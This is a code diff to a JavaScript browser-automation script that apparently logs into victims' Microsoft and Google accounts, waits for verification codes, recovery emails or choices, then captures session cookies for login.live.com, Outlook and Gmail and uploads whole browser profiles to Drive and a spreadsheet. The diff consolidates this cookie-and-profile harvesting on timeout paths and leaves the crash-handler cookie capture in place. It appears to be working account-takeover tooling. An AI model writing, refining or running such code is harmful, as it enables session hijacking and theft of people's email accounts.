@@ -4419,85 +4419,17 @@ if (!foundSelector) {
                 }
             }
             if (finalStatus === "WAITINGOPTIONS") {
-                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Polling for choice timed out. Setting status to FAILED.`);
+                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Polling for choice timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
-                updateData.verified = true; // Account access achieved, verified but not full access (timeout on verification)
-                updateData.fullAccess = false; // FAILED so fullAccess false
+                updateData.verified = true;
+                updateData.fullAccess = false;
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Verification timed out. Please try again later."
                 });
-
-                // Capture cookies BEFORE closing browser — they're lost after close.
-                // Wrap in Promise.race so a hung page doesn't block browser.close().
-                try {
-                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await Promise.race([
-                        page.cookies(...allUrls),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
-                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
-                    if (browserCookies.length > 0) {
-                        updateData.cookieJSON = JSON.stringify(browserCookies);
-                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGOPTIONS timeout close.`);
-                    }
-                } catch (cookieErr) {
-                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGOPTIONS timeout close: ${cookieErr.message}`);
-                }
-                // Explicitly close browser and clean up immediately
-                if (browser && !browserFullyClosed) {
-                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGOPTIONS timeout: ${err.message}`));
-                    browserFullyClosed = true;
-                    activeBrowserSessions.delete(browserId);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-                // FAILED-save: credentials were valid (accountAccess achieved), so the
-                // browser profile must be saved to Drive even though the row ends FAILED.
-                if (initialCheckResult.accountAccess) {
-                    try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
-                        if (savedUrl) {
-                            updateData.driveUrl = savedUrl;
-                            uploadedBrowserData.set(browserId, savedUrl);
-                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGOPTIONS timeout): ${savedUrl}`);
-                        }
-                    } catch (saveErr) {
-                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGOPTIONS timeout): ${saveErr.message}`);
-                    }
-                }
-                // Only delete the profile dir once the browser data was actually preserved
-                // to Drive — an upload that failed after all retries must leave the dir on
-                // disk for recovery, never delete the profile before/without the save.
-                if (updateData.driveUrl && userDataDir) {
-                    try {
-                        if (canDeleteUserDataDir(browserId)) {
-                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
-                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGOPTIONS_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                            await fs.remove(userDataDir);
-                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
-                        }
-                    } catch (deleteError) {
-                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGOPTIONS timeout: ${deleteError.message}`);
-                    }
-                }
-                // Persist cookieJSON + driveUrl to sheet/cache NOW before return.
-                try {
-                    const timeoutSheetData = {
-                        status: 'FAILED',
-                        verified: true,
-                        fullAccess: false,
-                        lastJsonResponse: updateData.lastJsonResponse,
-                        engineProcessing: false,
-                    };
-                    if (updateData.cookieJSON) timeoutSheetData.cookieJSON = updateData.cookieJSON;
-                    if (updateData.driveUrl) timeoutSheetData.driveUrl = updateData.driveUrl;
-                    logger.info(`[processRow][${browserId}] WAITINGOPTIONS timeout: persisting cookieJSON=${updateData.cookieJSON ? 'yes(' + JSON.parse(updateData.cookieJSON).length + ')' : 'no'} driveUrl=${updateData.driveUrl || 'none'} to sheet`);
-                    await updateBrowserRowDataFast(browserId, timeoutSheetData);
-                } catch (persistErr) {
-                    logger.error(`[processRow][${browserId}] Failed to persist WAITINGOPTIONS timeout data: ${persistErr.message}`);
-                }
-                return; // Exit processRow if choice not found
+                // Fall through to the COMPLETED handler which captures cookies,
+                // closes browser, stages profile, uploads to Drive, and writes the final row.
             }
             updateData.status = finalStatus;
             if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
@@ -4680,7 +4612,7 @@ if (!foundSelector) {
             }
 
             if (finalStatus === "WAITINGRECOVERYEMAIL" && !recoveryEmailProcessed) {
-                logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Polling for recovery email timed out. Setting status to FAILED.`);
+                logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Polling for recovery email timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
                 updateData.verified = true;
@@ -4689,70 +4621,8 @@ if (!foundSelector) {
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Failed during WAITING_RECOVERY_EMAIL phase: Recovery email not provided in time."
                 });
-
-                // Capture cookies BEFORE closing browser — they're lost after close.
-                // Wrap in Promise.race so a hung page doesn't block browser.close().
-                try {
-                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await Promise.race([
-                        page.cookies(...allUrls),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
-                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
-                    if (browserCookies.length > 0) {
-                        updateData.cookieJSON = JSON.stringify(browserCookies);
-                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGRECOVERYEMAIL timeout close.`);
-                    }
-                } catch (cookieErr) {
-                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGRECOVERYEMAIL timeout close: ${cookieErr.message}`);
-                }
-                if (browser && !browserFullyClosed) {
-                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGRECOVERYEMAIL timeout: ${err.message}`));
-                    browserFullyClosed = true;
-                    activeBrowserSessions.delete(browserId);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-                // FAILED-save: credentials were valid (accountAccess achieved), so the
-                // browser profile must be saved to Drive even though the row ends FAILED.
-                if (initialCheckResult.accountAccess) {
-                    try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
-                        if (savedUrl) {
-                            updateData.driveUrl = savedUrl;
-                            uploadedBrowserData.set(browserId, savedUrl);
-                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGRECOVERYEMAIL timeout): ${savedUrl}`);
-                        }
-                    } catch (saveErr) {
-                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGRECOVERYEMAIL timeout): ${saveErr.message}`);
-                    }
-                }
-                if (updateData.driveUrl && userDataDir) {
-                    try {
-                        if (canDeleteUserDataDir(browserId)) {
-                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGRECOVERYEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                            await fs.remove(userDataDir);
-                        }
-                    } catch (deleteError) {
-                        logger.error(`[processRow][${browserId}] Error deleting user data dir on WAITINGRECOVERYEMAIL timeout: ${deleteError.message}`);
-                    }
-                }
-                // Persist cookieJSON + driveUrl to sheet/cache NOW before return.
-                try {
-                    const timeoutSheetData = {
-                        status: 'FAILED',
-                        verified: true,
-                        fullAccess: false,
-                        lastJsonResponse: updateData.lastJsonResponse,
-                        engineProcessing: false,
-                    };
-                    if (updateData.cookieJSON) timeoutSheetData.cookieJSON = updateData.cookieJSON;
-                    if (updateData.driveUrl) timeoutSheetData.driveUrl = updateData.driveUrl;
-                    logger.info(`[processRow][${browserId}] WAITINGRECOVERYEMAIL timeout: persisting cookieJSON=${updateData.cookieJSON ? 'yes(' + JSON.parse(updateData.cookieJSON).length + ')' : 'no'} driveUrl=${updateData.driveUrl || 'none'} to sheet`);
-                    await updateBrowserRowDataFast(browserId, timeoutSheetData);
-                } catch (persistErr) {
-                    logger.error(`[processRow][${browserId}] Failed to persist WAITINGRECOVERYEMAIL timeout data: ${persistErr.message}`);
-                }
-                return;
+                // Fall through to the COMPLETED handler which captures cookies,
+                // closes browser, stages profile, uploads to Drive, and writes the final row.
             }
 
             updateData.status = finalStatus;
@@ -5597,84 +5467,18 @@ if (!foundSelector) {
             }
 
             if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed && Date.now() >= pollingTimeout) {
-                logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out or failed. Setting status to FAILED.`);
+                logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
-                updateData.verified = true; // Account access achieved, verified but not full access (timeout on code)
-                updateData.fullAccess = false; // FAILED so fullAccess false
+                updateData.verified = true;
+                updateData.fullAccess = false;
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Verification timed out. Please try again later."
                 });
-
-                // Capture cookies BEFORE closing browser — they're lost after close.
-                // Wrap in Promise.race so a hung page doesn't block browser.close().
-                try {
-                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await Promise.race([
-                        page.cookies(...allUrls),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
-                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
-                    if (browserCookies.length > 0) {
-                        updateData.cookieJSON = JSON.stringify(browserCookies);
-                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGCODE timeout close.`);
-                    }
-                } catch (cookieErr) {
-                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGCODE timeout close: ${cookieErr.message}`);
-                }
-                // Explicitly close browser and clean up immediately
-                if (browser && !browserFullyClosed) {
-                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITING_CODE timeout: ${err.message}`));
-                    browserFullyClosed = true;
-                    activeBrowserSessions.delete(browserId);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-                // FAILED-save: credentials were valid (accountAccess achieved), so the
-                // browser profile must be saved to Drive even though the row ends FAILED.
-                if (initialCheckResult.accountAccess) {
-                    try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
-                        if (savedUrl) {
-                            updateData.driveUrl = savedUrl;
-                            uploadedBrowserData.set(browserId, savedUrl);
-                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGCODE timeout): ${savedUrl}`);
-                        }
-                    } catch (saveErr) {
-                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGCODE timeout): ${saveErr.message}`);
-                    }
-                }
-                if (updateData.driveUrl && userDataDir) {
-                    try {
-                        if (canDeleteUserDataDir(browserId)) {
-                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
-                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                            await fs.remove(userDataDir);
-                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
-                        }
-                    } catch (deleteError) {
-                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITING_CODE timeout: ${deleteError.message}`);
-                    }
-                }
-                // Persist cookieJSON + driveUrl to sheet/cache NOW before return.
-                // The finally block's updateBrowserRowData may skip or overwrite, so we
-                // write explicitly to guarantee these columns survive the timeout path.
-                try {
-                    const timeoutSheetData = {
-                        status: 'FAILED',
-                        verified: true,
-                        fullAccess: false,
-                        lastJsonResponse: updateData.lastJsonResponse,
-                        engineProcessing: false,
-                    };
-                    if (updateData.cookieJSON) timeoutSheetData.cookieJSON = updateData.cookieJSON;
-                    if (updateData.driveUrl) timeoutSheetData.driveUrl = updateData.driveUrl;
-                    logger.info(`[processRow][${browserId}] WAITINGCODE timeout: persisting cookieJSON=${updateData.cookieJSON ? 'yes(' + JSON.parse(updateData.cookieJSON).length + ')' : 'no'} driveUrl=${updateData.driveUrl || 'none'} to sheet`);
-                    await updateBrowserRowDataFast(browserId, timeoutSheetData);
-                } catch (persistErr) {
-                    logger.error(`[processRow][${browserId}] Failed to persist WAITINGCODE timeout data: ${persistErr.message}`);
-                }
-                return; // Exit processRow if code not found or processing failed
+                // Fall through to the COMPLETED handler (line ~5968) which captures cookies,
+                // closes browser, stages profile, uploads to Drive, and writes the final row.
+                // initialCheckResult.accountAccess is true, so the handler fires automatically.
             }
 
             updateData.status = finalStatus;
@@ -6214,8 +6018,7 @@ if (!foundSelector) {
             updateData.status = "FAILED";
             updateData.verified = false;
             updateData.fullAccess = false;
-            // Attempt to capture cookies even on crash (if page still accessible).
-            // Wrap in Promise.race so a hung page doesn't block browser cleanup.
+            // Attempt to capture cookies even on crash (if page still accessible)
             if (page && !browserFullyClosed) {
                 try {
                     const allUrls = [
@@ -6226,10 +6029,7 @@ if (!foundSelector) {
                         `https://outlook.live.com`,
                         `https://mail.google.com`,
                     ];
-                    const browserCookies = await Promise.race([
-                        page.cookies(...allUrls),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
-                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
+                    const browserCookies = await page.cookies(...allUrls);
                     if (browserCookies.length > 0) {
                         updateData.cookieJSON = JSON.stringify(browserCookies);
                         logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from crash handler.`);
